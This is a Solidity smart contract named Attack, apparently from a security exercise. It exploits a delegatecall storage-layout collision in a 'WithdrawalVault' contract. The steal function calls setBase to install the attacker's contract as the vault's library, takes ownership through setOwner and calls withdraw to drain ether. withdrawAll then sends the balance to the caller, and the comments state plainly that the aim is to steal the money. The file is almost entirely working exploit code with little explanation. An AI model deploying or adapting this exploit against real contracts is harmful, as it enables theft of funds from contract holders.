// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack{
    
    // to attack withdrawalVault contract by using the vulnerability of delegatcall, parameters must match in terms of storage layout

    address public numberLibrary; 
    
    uint public currentNumber; 
    
    uint public offsetCounter; 
 
    // function selector of the withdraw function of WithdrawVault
    bytes4 constant seqSig = bytes4(keccak256("withdraw()"));

    address owner;

    address public withdrawalVault;

    // constructor
    constructor(address _withdrawalVault) public {
        withdrawalVault = _withdrawalVault;
    }

    // set the owner as the Attack contract
    function setOwner() public {
        owner = msg.sender;
    }

    // it is replaced with the getNumber inside the withdraw function of withdrawalVault, now all ether can be withdrawn at once
    function getNumber(uint offset) public {
        currentNumber = 50;
    }

    // function to steal money from the withdrawal vault
    function steal() public {
       
        // setbase delegatecall from fallback to make our address as new numberLibrary
        (bool status4,) = withdrawalVault.call(abi.encodeWithSignature("setBase(uint256)", uint256(uint160(address(this)))));
        
        // call our setOwner, now we are the owner of withdrawalVault
        (bool status,) =  withdrawalVault.call(abi.encodeWithSignature("setOwner()"));

        //withdraw money (50 ether) to Attack contract
        (bool status3,) = withdrawalVault.call(abi.encodePacked(seqSig));
    }

    // transfer all money to the Attacker's account from this contract
     function withdrawAll() public {
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable{}

}